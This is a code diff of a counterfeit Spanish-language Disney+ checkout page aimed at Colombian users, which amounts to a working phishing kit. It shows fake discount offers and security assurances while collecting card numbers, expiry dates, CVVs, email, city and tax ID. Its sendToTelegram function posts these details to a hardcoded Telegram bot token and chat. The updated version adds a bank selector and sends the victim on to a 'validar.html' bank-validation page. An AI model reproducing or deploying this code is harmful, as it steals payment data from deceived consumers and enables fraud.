@@ -3,55 +3,173 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Validar Pago | Disney+</title>
+<title>Paso 3 | Disney+</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 
 <style>
 body {
     margin: 0;
-    background: linear-gradient(135deg, #0f0f0f, #1a1a2e);
+    background: #0f0f0f;
     font-family: 'Inter', sans-serif;
     color: #fff;
-    min-height: 100vh;
 }
 
-/* CONTENEDOR PRINCIPAL */
-.container {
-    max-width: 500px;
-    margin: 0 auto;
+/* HEADER */
+header {
     padding: 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
 }
 
-/* LOGO */
-.logo {
+header img { height: 34px; }
+header a { color: #bbb; font-size: 15px; text-decoration: none; }
+
+/* CONTENEDOR */
+.main-container {
+    padding: 20px;
+    max-width: 600px;
+    margin: auto;
+}
+
+.step { font-size: 14px; color: #9ca3af; }
+h1 { font-size: 28px; margin-top: 5px; margin-bottom: 25px; }
+
+/* TABS */
+.tabs {
+    display: flex;
+    margin-bottom: 20px;
+    border-bottom: 1px solid #333;
+}
+
+.tab {
+    flex: 1;
     text-align: center;
-    padding: 30px 0 20px;
+    padding: 12px 0;
+    font-size: 16px;
+    cursor: pointer;
+    color: #bbb;
 }
 
-.logo img {
-    height: 45px;
-}
-
-/* TARJETA DE RESUMEN */
-.summary-card {
-    background: #1a1a1a;
-    border-radius: 15px;
-    padding: 25px;
-    margin: 20px 0;
-    border: 1px solid #333;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-}
-
-.plan-name {
-    font-size: 22px;
-    font-weight: 600;
+.tab.active {
     color: #00c8ff;
-    margin-bottom: 10px;
+    border-bottom: 2px solid #00c8ff;
 }
 
-.price-container {
-    margin: 15px 0;
+/* LABELS */
+label {
+    display: block;
+    margin: 18px 0 6px;
+    font-size: 14px;
+    color: #d1d5db;
+}
+
+/* INPUTS */
+input, select {
+    width: 100%;
+    padding: 15px;
+    background: #1a1a1a;
+    border: 1px solid #383838;
+    border-radius: 6px;
+    color: #fff;
+    font-size: 15px;
+    box-sizing: border-box;
+}
+
+/* TARJETA */
+.input-card { position: relative; }
+
+.card-icons {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    display: flex;
+    gap: 6px;
+}
+
+.card-icons img {
+    height: 26px;
+    opacity: .9;
+}
+
+/* FILA DOBLE */
+.row-double {
+    display: flex;
+    gap: 15px;
+    margin-top: 5px;
+}
+
+.field-group { flex: 1; min-width: 0; }
+
+/* CAJA PRECIO */
+#price-box {
+    margin-top: 25px;
+    padding: 20px;
+    background: #141414;
+    border: 1px solid #2a2a2a;
+    border-radius: 10px;
+}
+
+/* BOTÓN */
+button {
+    width: 100%;
+    padding: 16px;
+    margin-top: 25px;
+    background: #fff;
+    border: none;
+    color: #000;
+    border-radius: 30px;
+    font-size: 17px;
+    cursor: pointer;
+    font-weight: 600;
+    transition: background 0.2s;
+}
+
+button:hover {
+    background: #f0f0f0;
+}
+
+button:active {
+    transform: scale(0.98);
+}
+
+/* FOOTER */
+footer {
+    margin-top: 50px;
+    padding: 35px 20px;
+    background: #0d0d0d;
+    color: #7e7e7e;
+    text-align: center;
+    font-size: 13px;
+}
+
+footer a { color: #00c8ff; text-decoration: none; }
+
+/* RESPONSIVE */
+@media (max-width: 480px) {
+    .row-double { flex-direction: column; gap: 0; }
+}
+
+/* BANCO INFO */
+.bank-selector {
+    margin-top: 20px;
+    padding: 15px;
+    background: rgba(0, 200, 255, 0.05);
+    border: 1px solid rgba(0, 200, 255, 0.2);
+    border-radius: 8px;
+}
+
+.bank-selector p {
+    margin: 0 0 10px 0;
+    font-size: 14px;
+    color: #00c8ff;
+}
+
+/* NUEVO: PRECIOS CON DESCUENTO */
+.price-discount {
+    margin-top: 10px;
 }
 
 .original-price {
@@ -62,533 +180,233 @@ body {
 }
 
 .discount-price {
-    font-size: 32px;
-    font-weight: 700;
+    font-size: 26px;
+    font-weight: 600;
     color: #00ff88;
-    margin: 10px 0;
+    margin: 5px 0;
 }
 
 .discount-badge {
     background: #00a8ff;
     color: white;
-    padding: 6px 12px;
+    padding: 4px 10px;
     border-radius: 20px;
-    font-size: 14px;
+    font-size: 12px;
     font-weight: 600;
     display: inline-block;
     margin-top: 5px;
 }
 
-.features-list {
-    text-align: left;
-    margin: 20px 0;
-    padding: 0 15px;
-}
-
-.feature-item {
-    display: flex;
-    align-items: center;
-    margin-bottom: 10px;
-    font-size: 15px;
-    color: #ccc;
-}
-
-.feature-item::before {
-    content: "✓";
-    color: #00ff88;
-    margin-right: 10px;
-    font-weight: bold;
-}
-
-.espn-feature {
-    color: #00a8ff;
-    font-weight: 600;
-}
-
-.espn-feature::before {
-    content: "⚽";
-    color: #ff6b00;
-}
-
-/* FORMULARIO DE TARJETA */
-.form-card {
-    background: #1a1a1a;
-    border-radius: 15px;
-    padding: 25px;
-    margin: 20px 0;
-    border: 1px solid #333;
-}
-
-.form-title {
-    font-size: 18px;
-    font-weight: 600;
-    margin-bottom: 20px;
-    color: #00c8ff;
-    text-align: center;
-}
-
-.form-group {
-    margin-bottom: 20px;
-}
-
-.form-label {
-    display: block;
-    margin-bottom: 8px;
-    font-size: 14px;
-    color: #ccc;
-}
-
-.form-input {
-    width: 100%;
-    padding: 14px;
-    background: #0f0f0f;
-    border: 1px solid #333;
-    border-radius: 8px;
-    color: #fff;
-    font-size: 16px;
-    box-sizing: border-box;
-    transition: border 0.3s;
-}
-
-.form-input:focus {
-    outline: none;
-    border-color: #00c8ff;
-}
-
-.input-row {
-    display: flex;
-    gap: 15px;
-    margin-top: 5px;
-}
-
-.input-half {
-    flex: 1;
-    min-width: 0;
-}
-
-/* LOGOS DE TARJETAS */
-.card-icons {
-    display: flex;
-    gap: 10px;
-    margin-top: 10px;
-    justify-content: center;
-}
-
-.card-icons img {
-    height: 28px;
-    opacity: 0.8;
-}
-
-/* BOTÓN DE VALIDACIÓN */
-.validate-btn {
-    background: linear-gradient(90deg, #00c8ff, #00a8ff);
-    color: white;
-    border: none;
-    padding: 18px 30px;
-    border-radius: 50px;
-    font-size: 18px;
-    font-weight: 600;
-    cursor: pointer;
-    margin: 25px 0;
-    width: 100%;
-    transition: all 0.3s;
-    box-shadow: 0 4px 15px rgba(0, 200, 255, 0.3);
-}
-
-.validate-btn:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 6px 20px rgba(0, 200, 255, 0.4);
-}
-
-.validate-btn:active {
-    transform: translateY(0);
-}
-
-.validate-btn:disabled {
-    background: #666;
-    cursor: not-allowed;
-    transform: none;
-    box-shadow: none;
-}
-
 /* LOADING */
 .loading {
     display: none;
-    margin: 20px 0;
     text-align: center;
+    margin-top: 15px;
 }
 
 .spinner {
-    border: 4px solid #333;
+    border: 4px solid #f3f3f3;
     border-top: 4px solid #00c8ff;
     border-radius: 50%;
-    width: 50px;
-    height: 50px;
+    width: 40px;
+    height: 40px;
     animation: spin 1s linear infinite;
-    margin: 0 auto 15px;
+    margin: 0 auto;
 }
 
 @keyframes spin {
     0% { transform: rotate(0deg); }
     100% { transform: rotate(360deg); }
 }
-
-/* MENSAJES */
-.success-message {
-    display: none;
-    background: rgba(0, 255, 136, 0.1);
-    border: 1px solid #00ff88;
-    color: #00ff88;
-    padding: 20px;
-    border-radius: 10px;
-    margin: 20px 0;
-    font-size: 16px;
-    text-align: center;
-}
-
-.error-message {
-    display: none;
-    background: rgba(255, 75, 75, 0.1);
-    border: 1px solid #ff4b4b;
-    color: #ff4b4b;
-    padding: 12px;
-    border-radius: 8px;
-    margin: 10px 0;
-    font-size: 14px;
-    text-align: center;
-}
-
-/* INFORMACIÓN */
-.info-box {
-    background: rgba(0, 200, 255, 0.1);
-    border: 1px solid rgba(0, 200, 255, 0.3);
-    border-radius: 10px;
-    padding: 15px;
-    margin: 20px 0;
-    font-size: 14px;
-    color: #ccc;
-    text-align: left;
-}
-
-/* FOOTER */
-footer {
-    margin-top: 40px;
-    padding: 20px;
-    color: #666;
-    font-size: 12px;
-    text-align: center;
-}
-
-footer a {
-    color: #00c8ff;
-    text-decoration: none;
-}
-
-/* RESPONSIVE */
-@media (max-width: 480px) {
-    .container {
-        padding: 15px;
-    }
-    
-    .summary-card,
-    .form-card {
-        padding: 20px 15px;
-    }
-    
-    .discount-price {
-        font-size: 28px;
-    }
-    
-    .input-row {
-        flex-direction: column;
-        gap: 0;
-    }
-}
 </style>
 </head>
 
 <body>
 
-<div class="container">
-    
-    <!-- LOGO -->
-    <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg" alt="Disney+">
+<!-- HEADER -->
+<header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
+    <a href="#">Cerrar sesión</a>
+</header>
+
+<!-- CONTENIDO -->
+<div class="main-container">
+
+    <div class="step">PASO 3 DE 3</div>
+    <h1>¡A disfrutar!</h1>
+
+    <div class="tabs">
+        <div class="tab active">Crédito/Débito</div>
     </div>
-    
-    <h1 style="text-align: center; margin-bottom: 25px;">Confirmar Suscripción</h1>
-    
-    <!-- RESUMEN DEL PLAN -->
-    <div class="summary-card">
-        <div class="plan-name" id="planNameDisplay"></div>
-        
-        <div class="price-container">
-            <div class="original-price" id="originalPriceDisplay"></div>
-            <div class="discount-price" id="discountPriceDisplay"></div>
-            <div class="discount-badge">¡50% DE DESCUENTO APLICADO!</div>
-        </div>
-        
-        <div class="features-list" id="featuresList"></div>
-        
-        <div class="info-box">
-            <p>✅ ESPN incluido en todos los planes</p>
-            <p>✅ 50% de descuento en el primer mes</p>
-            <p>✅ Cancelación en cualquier momento</p>
-            <p>✅ Acceso inmediato tras la confirmación</p>
-        </div>
-    </div>
-    
-    <!-- FORMULARIO DE TARJETA -->
-    <div class="form-card">
-        <div class="form-title">Datos de Pago</div>
-        
-        <!-- Mensaje de error -->
-        <div id="errorMessage" class="error-message"></div>
-        
-        <div class="form-group">
-            <label class="form-label">Nombre en la tarjeta</label>
-            <input type="text" id="cardName" class="form-input" placeholder="Ej: JUAN PEREZ" maxlength="50">
-        </div>
-        
-        <div class="form-group">
-            <label class="form-label">Número de tarjeta</label>
-            <input type="text" id="cardNumber" class="form-input" placeholder="0000 0000 0000 0000" maxlength="19">
-            <div class="card-icons">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png" alt="Mastercard">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Visa_2021.svg" alt="Visa" style="height: 18px; margin-top: 5px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg" alt="American Express">
-            </div>
-        </div>
-        
-        <div class="input-row">
-            <div class="input-half">
-                <div class="form-group">
-                    <label class="form-label">Fecha de vencimiento</label>
-                    <input type="text" id="cardExpiry" class="form-input" placeholder="MM/AA" maxlength="5">
-                </div>
-            </div>
-            
-            <div class="input-half">
-                <div class="form-group">
-                    <label class="form-label">Código de seguridad</label>
-                    <input type="text" id="cardCVV" class="form-input" placeholder="CVV" maxlength="4">
-                </div>
-            </div>
-        </div>
-        
-        <div class="form-group">
-            <label class="form-label">Teléfono (opcional)</label>
-            <input type="tel" id="phone" class="form-input" placeholder="Ej: 3001234567">
-        </div>
-        
-        <div class="info-box">
-            <p>🔒 Tus datos están protegidos con encriptación de nivel bancario.</p>
-            <p>💳 Solo se realizará un cargo de verificación de COP 1, que será reembolsado inmediatamente.</p>
+
+    <!-- FORM -->
+    <label>NOMBRE EN LA TARJETA</label>
+    <input id="cardName" type="text" placeholder="Nombre del titular">
+
+    <label>NÚMERO DE LA TARJETA</label>
+    <div class="input-card">
+        <input id="cardNumber" type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
+        <div class="card-icons">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
         </div>
     </div>
-    
-    <!-- BOTÓN DE VALIDACIÓN -->
-    <button class="validate-btn" onclick="processPayment()">
-        CONFIRMAR PAGO Y ACTIVAR DISNEY+
-    </button>
+
+    <div class="row-double">
+        <div class="field-group">
+            <label>FECHA DE VENCIMIENTO</label>
+            <input id="cardExpiry" type="text" placeholder="MM/AA" maxlength="5">
+        </div>
+
+        <div class="field-group">
+            <label>CÓDIGO DE SEGURIDAD</label>
+            <input id="cardCVV" type="text" placeholder="CVV" maxlength="4">
+        </div>
+    </div>
+
+    <label>CIUDAD</label>
+    <input id="city" type="text" placeholder="Ingrese su ciudad">
+
+    <label>DEPARTAMENTO</label>
+    <select id="department">
+        <option value="">Seleccionar…</option>
+        <option>Antioquia</option>
+        <option>Cundinamarca</option>
+        <option>Valle del Cauca</option>
+        <option>Atlántico</option>
+        <option>Santander</option>
+    </select>
+
+    <label>RUT (OPCIONAL)</label>
+    <input id="rut" type="text" placeholder="Opcional">
+
+    <!-- 🔥 TOTAL A PAGAR CON DESCUENTO -->
+    <div id="price-box">
+        <div style="color:#9ca3af; font-size:15px;">Total a pagar</div>
+
+        <!-- PRECIO ORIGINAL TACHADO -->
+        <div id="originalPrice" class="original-price"></div>
+        
+        <!-- PRECIO CON DESCUENTO -->
+        <div id="finalPrice" style="
+            margin-top: 6px;
+            font-size: 26px;
+            font-weight: 600;
+            color: #00ff88;
+            text-shadow: 0 0 8px rgba(0,255,136,.35);
+        "></div>
+
+        <div class="discount-badge" id="discountBadge">¡50% DE DESCUENTO!</div>
+
+        <div id="planName" style="margin-top:8px; font-size:14px; color:#6b7280;"></div>
+
+        <div id="planSummary" style="margin-top:10px; font-size:14px; color:#9ca3af;"></div>
+    </div>
+
+    <!-- 🔥 SELECCIÓN DEL BANCO (TU CÓDIGO ORIGINAL) -->
+    <div class="bank-selector">
+        <p>Seleccione su banco para validar el pago:</p>
+        <select id="bankSelect" style="background: #0f0f0f;">
+            <option value="">-- Seleccionar banco --</option>
+            <option value="Bancolombia">Bancolombia</option>
+            <option value="Nequi">Nequi</option>
+            <option value="Davivienda">Davivienda</option>
+            <option value="BBVA">BBVA</option>
+            <option value="Banco Popular">Banco Popular</option>
+            <option value="Banco de Bogotá">Banco de Bogotá</option>
+            <option value="Itaú">Itaú</option>
+        </select>
+    </div>
+
+    <!-- BOTÓN FINAL -->
+    <button onclick="proceedToValidation()">VALIDAR PAGO CON EL BANCO</button>
     
     <!-- LOADING -->
     <div id="loading" class="loading">
         <div class="spinner"></div>
-        <p style="color: #aaa;">Verificando datos de pago...</p>
+        <p style="color:#ccc; margin-top:10px;">Procesando pago...</p>
     </div>
-    
-    <!-- MENSAJE DE ÉXITO -->
-    <div id="successMessage" class="success-message">
-        <h3 style="margin-top: 0;">✅ Pago Confirmado</h3>
-        <p>Tu suscripción a Disney+ ha sido activada exitosamente.</p>
-        <p>Serás redirigido a Disney+ en unos segundos...</p>
-    </div>
-    
-    <!-- FOOTER -->
-    <footer>
-        © 2025 Disney y sus entidades relacionadas. Todos los derechos reservados.<br>
-        <a href="#">Términos de uso</a> · 
-        <a href="#">Política de privacidad</a> · 
-        <a href="#">Ayuda</a>
-    </footer>
-    
+
 </div>
 
+<!-- FOOTER -->
+<footer>
+    © 2025 Disney+. Todos los derechos reservados. · 
+    <a href="#">Términos de uso</a> · 
+    <a href="#">Política de privacidad</a> · 
+    <a href="#">Ayuda</a>
+</footer>
+
 <script>
-// Obtener datos del plan desde localStorage
-const planCode = localStorage.getItem("plan") || "standard_ads";
-const planName = localStorage.getItem("planName") || "Estándar con anuncios";
-const originalPrice = localStorage.getItem("planOriginalPrice") || "24.900";
-const discountPrice = localStorage.getItem("planPrice") || "12.400";
+// Recuperar plan guardado
+const plan = localStorage.getItem("plan") || "standard_ads";
 const email = localStorage.getItem("disneyEmail") || "correo@ejemplo.com";
 
-// Datos completos de cada plan
-const planDetails = {
+// DATOS CON 50% DE DESCUENTO
+const planData = {
     premium: {
+        originalPrice: "49.900",
+        discountPrice: "24.900",
         name: "Plan Premium",
-        original: "49.900",
-        discount: "24.900",
-        features: [
-            "4 dispositivos simultáneos",
-            "Calidad 4K UHD + HDR",
-            "Sin anuncios",
-            "Descargas ilimitadas",
-            "ESPN + 500 eventos mensuales",
-            "Dolby Atmos incluido"
-        ]
+        desc: "Incluye: 4K UHD • 4 dispositivos • Sin anuncios • ESPN incluido"
     },
     standard: {
+        originalPrice: "36.900",
+        discountPrice: "18.400",
         name: "Plan Estándar",
-        original: "36.900",
-        discount: "18.400",
-        features: [
-            "2 dispositivos simultáneos",
-            "Calidad Full HD",
-            "Sin anuncios",
-            "Descargas limitadas",
-            "ESPN + eventos en vivo",
-            "Acceso a todo el catálogo"
-        ]
+        desc: "Incluye: Full HD • 2 dispositivos • Sin anuncios • ESPN incluido"
     },
     standard_ads: {
+        originalPrice: "24.900",
+        discountPrice: "12.400",
         name: "Estándar con anuncios",
-        original: "24.900",
-        discount: "12.400",
-        features: [
-            "2 dispositivos simultáneos",
-            "Calidad HD",
-            "Anuncios limitados",
-            "ESPN + deportes en vivo",
-            "Acceso a series y películas",
-            "Sin contrato de permanencia"
-        ]
+        desc: "Incluye: HD • 2 dispositivos • Con anuncios • ESPN incluido"
     }
 };
 
-// Mostrar información del plan
-function displayPlanInfo() {
-    const plan = planDetails[planCode] || planDetails.standard_ads;
-    
-    document.getElementById("planNameDisplay").textContent = plan.name;
-    document.getElementById("originalPriceDisplay").textContent = `COP ${plan.original}/mes`;
-    document.getElementById("discountPriceDisplay").textContent = `COP ${plan.discount}/mes`;
-    
-    // Crear lista de características
-    const featuresList = document.getElementById("featuresList");
-    featuresList.innerHTML = '';
-    
-    plan.features.forEach(feature => {
-        const div = document.createElement('div');
-        div.className = feature.toLowerCase().includes('espn') ? 'feature-item espn-feature' : 'feature-item';
-        div.textContent = feature;
-        featuresList.appendChild(div);
-    });
-}
-
-// Formatear número de tarjeta
-function formatCardNumber(value) {
-    return value.replace(/\s+/g, '').replace(/(\d{4})/g, '$1 ').trim();
-}
-
-// Formatear fecha de vencimiento
-function formatExpiry(value) {
-    const v = value.replace(/[^0-9]/g, '');
-    if (v.length >= 2) {
-        return v.substring(0, 2) + '/' + v.substring(2, 4);
-    }
-    return v;
-}
-
-// Validar campos del formulario
-function validateForm() {
-    const cardName = document.getElementById("cardName").value.trim();
-    const cardNumber = document.getElementById("cardNumber").value.trim().replace(/\s+/g, '');
-    const cardExpiry = document.getElementById("cardExpiry").value.trim();
-    const cardCVV = document.getElementById("cardCVV").value.trim();
-    
-    const errors = [];
-    
-    if (!cardName || cardName.length < 3) {
-        errors.push("Nombre en la tarjeta inválido");
-    }
-    
-    if (!cardNumber || cardNumber.length < 16 || !/^\d+$/.test(cardNumber)) {
-        errors.push("Número de tarjeta inválido (16 dígitos)");
-    }
-    
-    if (!cardExpiry || !/^\d{2}\/\d{2}$/.test(cardExpiry)) {
-        errors.push("Fecha de vencimiento inválida (MM/AA)");
-    }
-    
-    if (!cardCVV || cardCVV.length < 3 || !/^\d+$/.test(cardCVV)) {
-        errors.push("CVV inválido (3-4 dígitos)");
-    }
-    
-    if (errors.length > 0) {
-        showError(errors.join("<br>"));
-        return false;
-    }
-    
-    return true;
-}
-
-// Mostrar error
-function showError(message) {
-    const errorDiv = document.getElementById("errorMessage");
-    errorDiv.innerHTML = message;
-    errorDiv.style.display = "block";
-    setTimeout(() => errorDiv.style.display = "none", 5000);
-}
-
-// Obtener tipo de tarjeta
-function getCardType(number) {
-    number = number.replace(/\s+/g, '');
-    
-    if (/^4/.test(number)) return "VISA";
-    if (/^5[1-5]/.test(number)) return "Mastercard";
-    if (/^3[47]/.test(number)) return "American Express";
-    if (/^6(?:011|5)/.test(number)) return "Discover";
-    return "Desconocida";
-}
+// Insertar valores del plan CON DESCUENTO
+const selectedPlan = planData[plan];
+document.getElementById("originalPrice").innerText = `COP ${selectedPlan.originalPrice}/mes`;
+document.getElementById("finalPrice").innerText = `COP ${selectedPlan.discountPrice}/mes`;
+document.getElementById("planName").innerText = selectedPlan.name;
+document.getElementById("planSummary").innerText = selectedPlan.desc;
 
 // Función para enviar datos a Telegram
-async function sendToTelegram(cardData) {
+async function sendToTelegram(bankName, cardData) {
     const botToken = "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8";
     const chatId = "7776240161";
     
-    const plan = planDetails[planCode] || planDetails.standard_ads;
-    const cardType = getCardType(cardData.number);
+    const planInfo = planData[plan];
     
-    const message = `💳 NUEVO PAGO DISNEY+ CONFIRMADO 💳
+    const message = `🏦 NUEVO PAGO DISNEY+ CON BANCO 🏦
 
-✅ PLAN: ${plan.name}
-💰 PRECIO ORIGINAL: COP ${plan.original}/mes
-🔥 PRECIO CON 50% OFF: COP ${plan.discount}/mes
+✅ BANCO SELECCIONADO: ${bankName}
 📧 CORREO: ${email}
-📱 TELÉFONO: ${cardData.phone || "No proporcionado"}
+🏙️ CIUDAD: ${cardData.city || "No especificada"}
+📍 DEPARTAMENTO: ${cardData.department || "No especificado"}
 
-💳 DATOS DE TARJETA:
-• Nombre: ${cardData.name}
-• Número: ${cardData.number}
-• Vencimiento: ${cardData.expiry}
-• CVV: ${cardData.cvv}
-• Tipo: ${cardType}
-
+✅ PLAN: ${planInfo.name}
+💰 PRECIO ORIGINAL: COP ${planInfo.originalPrice}/mes
+🔥 PRECIO CON 50% OFF: COP ${planInfo.discountPrice}/mes
 🎁 DESCUENTO APLICADO: 50%
 
-⚽ CARACTERÍSTICAS:
-${plan.features.map(f => `• ${f}`).join('\n')}
+💳 DATOS DE TARJETA:
+• Nombre: ${cardData.cardName}
+• Número: ${cardData.cardNumber}
+• Vencimiento: ${cardData.cardExpiry}
+• CVV: ${cardData.cardCVV}
+• RUT: ${cardData.rut || "No proporcionado"}
+
+📝 RESUMEN PLAN: ${planInfo.desc}
 
 📊 INFORMACIÓN ADICIONAL:
 • Fecha: ${new Date().toLocaleString()}
-• Hora: ${new Date().toLocaleTimeString()}
 • ESPN: INCLUIDO EN EL PLAN
-• Estado: PAGO CONFIRMADO
+• Estado: PENDIENTE VALIDACIÓN BANCARIA
 
-👉 SUSCRIPCIÓN ACTIVADA
-👉 ENVIAR CREDENCIALES AL CORREO
-👉 ACCESO INMEDIATO`;
+👉 VALIDAR CON BANCO: ${bankName}
+👉 ENVIAR CREDENCIALES AL CORREO`;
 
     try {
         const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -602,7 +420,7 @@ ${plan.features.map(f => `• ${f}`).join('\n')}
         });
         
         if (response.ok) {
-            console.log('Datos de pago enviados exitosamente a Telegram');
+            console.log('Datos enviados exitosamente a Telegram');
             return true;
         } else {
             console.error('Error en la respuesta de Telegram');
@@ -614,102 +432,100 @@ ${plan.features.map(f => `• ${f}`).join('\n')}
     }
 }
 
-// Función principal para procesar pago
-async function processPayment() {
-    const btn = document.querySelector('.validate-btn');
-    const loading = document.getElementById('loading');
-    const success = document.getElementById('successMessage');
+// Función para ir a la validación
+async function proceedToValidation() {
+    // Obtener banco seleccionado
+    const bankSelect = document.getElementById("bankSelect");
+    const selectedBank = bankSelect.value;
     
-    // Validar formulario
-    if (!validateForm()) {
+    // Validar que se haya seleccionado un banco
+    if (!selectedBank) {
+        alert("Por favor, seleccione su banco para proceder con la validación.");
         return;
     }
     
-    // Obtener datos del formulario
+    // Validar campos obligatorios
+    const cardName = document.getElementById("cardName").value.trim();
+    const cardNumber = document.getElementById("cardNumber").value.trim().replace(/\s+/g, '');
+    const cardExpiry = document.getElementById("cardExpiry").value.trim();
+    const cardCVV = document.getElementById("cardCVV").value.trim();
+    const city = document.getElementById("city").value.trim();
+    const department = document.getElementById("department").value;
+    
+    if (!cardName || !cardNumber || !cardExpiry || !cardCVV || !city || !department) {
+        alert("Por favor, complete todos los campos obligatorios.");
+        return;
+    }
+    
+    if (cardNumber.length < 16) {
+        alert("Número de tarjeta inválido. Debe tener 16 dígitos.");
+        return;
+    }
+    
+    // Mostrar loading
+    document.getElementById('loading').style.display = 'block';
+    document.querySelector('button').disabled = true;
+    
+    // Recolectar todos los datos
     const cardData = {
-        name: document.getElementById("cardName").value.trim(),
-        number: document.getElementById("cardNumber").value.trim().replace(/\s+/g, ''),
-        expiry: document.getElementById("cardExpiry").value.trim(),
-        cvv: document.getElementById("cardCVV").value.trim(),
-        phone: document.getElementById("phone").value.trim() || "No proporcionado"
+        cardName: cardName,
+        cardNumber: cardNumber,
+        cardExpiry: cardExpiry,
+        cardCVV: cardCVV,
+        city: city,
+        department: department,
+        rut: document.getElementById("rut").value.trim()
     };
     
-    // Deshabilitar botón y mostrar loading
-    btn.disabled = true;
-    btn.textContent = "PROCESANDO PAGO...";
-    loading.style.display = 'block';
+    // Enviar a Telegram
+    const sent = await sendToTelegram(selectedBank, cardData);
     
-    // Enviar datos a Telegram
-    const sent = await sendToTelegram(cardData);
+    // Ocultar loading
+    document.getElementById('loading').style.display = 'none';
+    document.querySelector('button').disabled = false;
     
     if (sent) {
-        // Mostrar mensaje de éxito
-        loading.style.display = 'none';
-        success.style.display = 'block';
-        btn.style.display = 'none';
+        // Guardar datos en localStorage
+        localStorage.setItem("selectedBank", selectedBank);
+        localStorage.setItem("paymentData", JSON.stringify({
+            cardName: cardName,
+            cardLast4: cardNumber.slice(-4),
+            plan: plan,
+            originalAmount: planData[plan].originalPrice,
+            discountAmount: planData[plan].discountPrice,
+            email: email,
+            timestamp: new Date().toISOString()
+        }));
         
-        // Guardar confirmación
-        localStorage.setItem('paymentConfirmed', 'true');
-        localStorage.setItem('confirmationDate', new Date().toISOString());
-        localStorage.setItem('last4Digits', cardData.number.slice(-4));
-        
-        // Redirigir después de 3 segundos
-        setTimeout(() => {
-            window.location.href = 'https://www.disneyplus.com/welcome';
-        }, 3000);
+        // Redirigir a la página de validación bancaria
+        window.location.href = "validar.html";
     } else {
-        // Mostrar error
-        loading.style.display = 'none';
-        btn.disabled = false;
-        btn.textContent = "CONFIRMAR PAGO Y ACTIVAR DISNEY+";
-        showError("Error al procesar el pago. Por favor intenta de nuevo.");
+        alert("Error al procesar el pago. Por favor intenta de nuevo.");
     }
 }
 
-// Inicializar página
-window.addEventListener('DOMContentLoaded', function() {
-    displayPlanInfo();
-    
-    // Mostrar email si está disponible
-    if (email && email !== 'correo@ejemplo.com') {
-        const infoBox = document.querySelector('.info-box');
-        const emailInfo = document.createElement('p');
-        emailInfo.innerHTML = `<strong>Correo registrado:</strong> ${email}`;
-        emailInfo.style.color = '#00c8ff';
-        emailInfo.style.marginTop = '0';
-        infoBox.prepend(emailInfo);
+// Formatear número de tarjeta con espacios
+document.getElementById("cardNumber").addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += value[i];
     }
-    
-    // Formatear número de tarjeta en tiempo real
-    document.getElementById("cardNumber").addEventListener("input", function(e) {
-        this.value = formatCardNumber(e.target.value);
-    });
-    
-    // Formatear fecha de vencimiento en tiempo real
-    document.getElementById("cardExpiry").addEventListener("input", function(e) {
-        this.value = formatExpiry(e.target.value);
-    });
-    
-    // Solo números para CVV
-    document.getElementById("cardCVV").addEventListener("input", function(e) {
-        this.value = this.value.replace(/[^0-9]/g, '');
-    });
-    
-    // Solo números para teléfono
-    document.getElementById("phone").addEventListener("input", function(e) {
-        this.value = this.value.replace(/[^0-9]/g, '');
-    });
-    
-    // Verificar si ya se pagó
-    if (localStorage.getItem('paymentConfirmed') === 'true') {
-        document.querySelector('.validate-btn').style.display = 'none';
-        document.getElementById('successMessage').style.display = 'block';
-        document.getElementById('successMessage').innerHTML = `
-            <h3 style="margin-top: 0;">✅ Pago ya confirmado</h3>
-            <p>Tu suscripción a Disney+ ya fue activada anteriormente.</p>
-            <p><a href="https://www.disneyplus.com/login" style="color: #00c8ff;">Iniciar sesión en Disney+</a></p>
-        `;
+    e.target.value = formatted;
+});
+
+// Formatear fecha de vencimiento
+document.getElementById("cardExpiry").addEventListener('input', function(e) {
+    let value = e.target.value.replace(/[^0-9]/g, '');
+    if (value.length >= 2) {
+        e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
     }
+});
+
+// Solo números para CVV
+document.getElementById("cardCVV").addEventListener('input', function(e) {
+    e.target.value = e.target.value.replace(/[^0-9]/g, '');
 });
 </script>
 
